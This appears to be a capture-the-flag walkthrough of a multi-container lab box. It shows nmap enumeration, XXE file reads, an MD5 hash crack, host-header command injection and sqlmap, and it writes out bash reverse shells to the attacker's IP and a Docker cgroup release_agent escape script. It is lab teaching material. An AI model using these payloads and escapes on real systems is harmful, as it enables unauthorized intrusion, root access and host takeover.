## Enumeration
```bash
nmap -A -T4 --open 10.10.15.130
```

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 88:2b:72:3e:65:ed:9a:4c:16:75:2c:af:16:e0:30:7e (RSA)
|   256 bc:b4:0b:59:77:77:73:3d:f0:9f:bd:b0:77:d5:20:f8 (ECDSA)
|_  256 fe:65:03:0e:52:c5:da:0d:c8:8d:f7:b4:2d:28:c5:96 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Server Manager Login
|_Requested resource was /login
|_http-server-header: Apache/2.4.41 (Ubuntu)
81/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Home Page
|_http-server-header: nginx/1.18.0 (Ubuntu)
82/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: I Love Hills - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:93:9a:3f:4b:cc:77:91:e3:c4:e2:67:93:fb:98:79 (RSA)
|   256 00:f9:5e:65:86:74:d8:2d:e1:8d:62:f6:7d:be:a7:07 (ECDSA)
|_  256 01:a0:a5:3c:2e:5e:02:fe:f5:d2:8a:dd:4c:44:1a:2b (ED25519)
8888/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.8.5)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/0.16.0 Python/3.8.5
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Wed, 02 Feb 2022 10:30:23 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
```

HTTP on ports: 80, 81, 82, 8888.
SSH on ports: 22, 2222.

## HTTP on 80
An interesting section on the source code indicates that a post request on the login page will go though a different route `/api/user/login`.

```bash
$('.login').click( function(){

        $.post('/api/user/login',{
            'username'  :   $('input[name="username"]').val(),
            'password'  :   $('input[name="password"]').val()
        },function(resp){
            if( resp.login ){
                window.location = '/token?token=' + resp.token;
            }else{
                alert( resp.error );
            }
        });


    })
```

Fuzzing the `/api/user` we find other interesting locations. 

```bash
$ gobuster dir -u 10.10.15.130/api/user -w /usr/share/wordlists/dirb/common.txt -r -t 120
```

```bash
/login                (Status: 200) [Size: 53]
/session              (Status: 200) [Size: 91]
```

Navigate to `/api/user/session` where a json contains an admin hash.

```bash
id	1
username	"admin"
hash	"1b4237f476826986da63022a76c35bb1"
```

Crack the md5 hash online with [Crackstation](https://crackstation.net/)

```bash
# After cracking the password
admin:dQw4w9WgXcQ
```

Unfortunately, back on Server Manager Login these credentials won't work. We'll move on enumerating the web.

However, due to the error message at `/api/user` 
```bash
"You do not have access to view all users"
```

we're led to believe that a parameter might exist to view users, most commonly `id`. Indeed when we input `/api/user?id=0` we get a different response.

```bash
"You do not have access to view user id: 0"
```

We are not sure that `id` is the only parameter so we'll use fuzzing to figure this out.

```bash
$ wfuzz -u http://10.10.15.130/api/user?FUZZ -w /usr/share/wordlists/rockyou.txt --hh=52
```

We have two parameters `id` and `xml`. The difference between these two is that the one returns json and the other xml data. With xml we have an attack in mind which is XXE.

In Burp modify the xml section and add the following 

```bash
# spin up a local server and send request with the following xxe payload
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://10.8.0.115/test"> ]>
<foo><id>&xxe;</id></foo>
```

Now we know that `/api/user` endpoint is vulnerable to XXE attacks. The cleanest method is to use php. filters and base64 encoding. Then we can copy the hash, decode it and review the data in a text editor.

```bash
# Collect anything you deem important
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
```

```bash
# xxe payload
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>

# Decoded (possible Lavarel structure)
<?php
include_once('../Autoload.php');
include_once('../Route.php');
include_once('../Output.php');
include_once('../View.php');

Route::load();
Route::run();
```

Knowning the Lavarel structure we can grab the code from the website.

```bash
# xxe payload
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../controllers/Website.php"> ]>

# Decoded
<SNIP>
if(isset($_COOKIE["token"]) && $_COOKIE["token"] === '1f7f97c3a7aa4a75194768b58ad8a71d')
<SNIP>
```

Now we've got the token which we know from earlier is part of the authentication. Back on Server Manager navigate to `/token?token=1f7f97c3a7aa4a75194768b58ad8a71d'` and you'll be logged in.

Under "Web Shells" we can execute code, so make a reverse connection with:

```bash
# open a listener on Kali
nc -lnvp 9001
# the payload 
/bin/bash -c 'bash -i >& /dev/tcp/10.8.0.115/9001 0>&1'
```

Enumerating the filesystem the file Api.php has admin login credentials
```bash
if( $_POST["username"] === 'admin' && $_POST["password"] === 'niceWorkHackerm4n' ){
```

From the `www-data` shell we can't use `su`, but we can connect with `ssh`.
```bash
# stabilize the shell
www-data@6b364d3940e6:/$ ssh admin@localhost bash # use bash to avoid rbash
# ssh will give us rbash (restricted), another way to escape from rbash is to update the PATH variable to include bash location
```

```bash
sudo -l
Matching Defaults entries for admin on 6b364d3940e6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on 6b364d3940e6:
    (ALL) ALL
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/nsenter
```

We can elevate privileges to root with no password

```bash
sudo /bin/bash
root@6b364d3940e6:/home/admin# 
```

To escape the docker env and become root on the host machine, we'll utilize the Linux cgroup v1 "notification on release" feature. This requires
1.  Running as root inside the container
2.  The container must be run with the `SYS_ADMIN` Linux capability
3.  The container must lack an AppArmor profile, or otherwise allow the `mount` syscall
4.  The cgroup v1 virtual filesystem must be mounted read-write inside the container

All requirements are satisfied as the `cap_sys_admin` capability is set .

```bash
capsh --print | grep cap_sys_admin

# Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.8.0.115/6767 0>&1'" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

More about this method [here](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)

Another similar method is described [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_admin)

Open a netcat listener, wait for a couple of minutes and you'll get a callback 

```bash
root@ip-10-10-225-196:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

We can enumerate the containers and select the ones we haven't been in.

```bash
$ docker container ls
CONTAINER ID   IMAGE       COMMAND                  CREATED         STATUS       PORTS                                          NAMES
498d22ea6efc   c3:latest   "/usr/bin/supervisor…"   11 months ago   Up 3 hours   22/tcp, 0.0.0.0:82->80/tcp                     c3
a9ef0531077f   c4:latest   "/usr/bin/supervisor…"   11 months ago   Up 3 hours   0.0.0.0:2222->22/tcp, 0.0.0.0:8888->8080/tcp   c4
6b364d3940e6   c1:latest   "/usr/bin/supervisor…"   11 months ago   Up 3 hours   22/tcp, 0.0.0.0:80->80/tcp                     c1
c418851a6a30   c2:latest   "/startup.sh"            11 months ago   Up 3 hours   22/tcp, 0.0.0.0:81->80/tcp                     c2
```

Move around the containers.
```bash
$ docker container exec -it <container-id> /bin/bash
```

## Further Exploring Other Vulnerabilites

## HTTP on 81

The webpage contains a "An Internal Service Error Occurred, Please Try Again Later" message. We find that the User-Agent uses curl to request `/api/product/<number>`, which can also be derived from the `access_log` hidden directory.

```bash
curl http://10.10.225.196:81 -I -v
*   Trying 10.10.225.196:81...
* Connected to 10.10.225.196 (10.10.225.196) port 81 (#0)
> HEAD / HTTP/1.1
> Host: 10.10.225.196:81
> User-Agent: curl/7.81.0 <-------------------- !
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
HTTP/1.1 404 Not Found
< Server: nginx/1.18.0 (Ubuntu)
Server: nginx/1.18.0 (Ubuntu)
< Date: Wed, 02 Feb 2022 20:04:08 GMT
Date: Wed, 02 Feb 2022 20:04:08 GMT
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8
< Connection: keep-alive
Connection: keep-alive
```

For `curl` to request a resource it would first need to use the http host header followed by the resource's path which leads us to believe that the host header could be potentially vulnerable to [host header injection](https://portswigger.net/web-security/host-header)

Indeed if we open a listener and make a request on our attack host we will get a response, using Burp.

```bash
# Request (Burp)
GET / HTTP/1.1
Host: 10.8.0.115:5566
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

# Response (netcat)
nc -lnvp 5566
listening on [any] 5566 ...
connect to [10.8.0.115] from (UNKNOWN) [10.10.225.196] 45532
GET /api/product HTTP/1.1
Host: 10.8.0.115:5566
User-Agent: curl/7.68.0
Accept: */*

# Reponse (python)
python3 -m http.server 5566
Serving HTTP on 0.0.0.0 port 5566 (http://0.0.0.0:5566/) ...
10.10.225.196 - - [02/Feb/2022 15:31:24] code 404, message File not found
10.10.225.196 - - [02/Feb/2022 15:31:24] "GET /api/product HTTP/1.1" 404 -
```

We can take advantage of curl to execute commands on the host machine.

```bash
# Code injection on host header
Host: 10.8.0.115:5566?$("id") # ?`id` also works
# response
10.10.225.196 - - [02/Feb/2022 15:39:02] "GET /?uid=33(www-data) HTTP/1.1" 200 -
```

We have code execution we can use an encoded reverse shell to gain access to the filesystem.

`echo <base64-encoded-rev-shell> | base64 -d | bash`

## HTTP on 82

Using directory fuzzing we find `/feed`, `/search`, `/view` and `/t`

Navigate to `/search`. Make a search and capture the request with Burp, save it and pass it to sqlmap to test for vulnerabilities.

```bash
$ sqlmap -r req.txt --dbs

# when the following question comes up press no
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n

available databases [2]:
[*] hillpics
[*] information_schema

```

Hillpics just contains all the pictures on the website and there's not else here.

## HTTP on 8888
On port 8888 we have `/apps`, `/users`.

Out of these two, the `/users` path discloses user credentials: `davelarkin:totallysecurehuh`.

Using the above creds we have a successful login on ssh port 2222.

```bash
$ hydra -l davelarkin -p "totallysecurehuh" ssh://10.10.15.130:2222                   

[DATA] attacking ssh://10.10.15.130:2222/
[2222][ssh] host: 10.10.15.130   login: davelarkin   password: totallysecurehuh
1 of 1 target successfully completed, 1 valid password found
```

```bash
davelarkin@a9ef0531077f:~$ whoami
davelarkin
```


